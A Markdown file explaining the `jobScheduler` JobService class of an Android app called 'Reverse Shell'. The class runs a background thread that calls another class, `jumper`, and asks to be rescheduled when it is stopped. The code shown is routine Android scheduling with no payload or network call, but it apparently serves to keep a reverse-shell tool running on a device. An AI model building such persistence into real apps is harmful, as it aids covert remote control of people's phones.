# JobScheduler Service for Reverse Shell Android Application

This Markdown file describes the `jobScheduler` class used in the Reverse Shell Android application. The `jobScheduler` class extends the `JobService` class provided by the Android framework and is responsible for scheduling and executing background tasks for the application.

## JobScheduler Service Overview

The `jobScheduler` class extends the `JobService` class to create a background service component. It utilizes the JobScheduler API introduced in Android Lollipop (API level 21) to schedule and execute background tasks.

## Code Explanation

```java
package com.example.reverseshell2;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.os.Build;
import android.util.Log;

import androidx.annotation.RequiresApi;

@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class jobScheduler extends JobService {
    private static final String TAG = "jobSchedulerTest";
    private boolean jobCancelled = false;

    @Override
    public boolean onStartJob(JobParameters jobParameters) {
        Log.d(TAG, "Job started");
        doBackgroundWork(jobParameters);
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters jobParameters) {
        Log.d(TAG, "Job cancelled before completion");
        jobCancelled = true;
        return true;
    }

    private void doBackgroundWork(final JobParameters params) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                new jumper(getApplicationContext()).init();
                Log.d(TAG, "Job finished");
                jobFinished(params, false);
            }
        }).start();
    }
}
```

- The `jobScheduler` class extends the `JobService` class and is annotated with `@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)` to indicate that it requires Android Lollipop (API level 21) or higher.
- The `TAG` variable is used for logging purposes.
- The `jobCancelled` variable is a boolean flag indicating if the job has been cancelled.
- The `onStartJob` method is overridden and called when the job is started.
  - It logs a message indicating that the job has started.
  - The `doBackgroundWork` method is called to perform the background work.
  - It returns `true` to indicate that the job is still running and will be completed asynchronously.
- The `onStopJob` method is overridden and called when the job is stopped before completion.
  - It logs a message indicating that the job has been cancelled.
  - The `jobCancelled` flag is set to `true`.
  - It returns `true` to indicate that the job should be rescheduled.
- The `doBackgroundWork` method performs the actual background work.
  - It creates a new thread and runs a `Runnable` inside it.
  - The `init` method of the `jumper` class is called to handle the initialization process.
  - It logs a message indicating that the job has finished.
  - The `jobFinished` method is called to inform the system that the job has completed.

## Usage

The `jobScheduler` class is used to schedule and execute background tasks for the Reverse Shell Android application. It utilizes the JobScheduler API to perform tasks asynchronously.
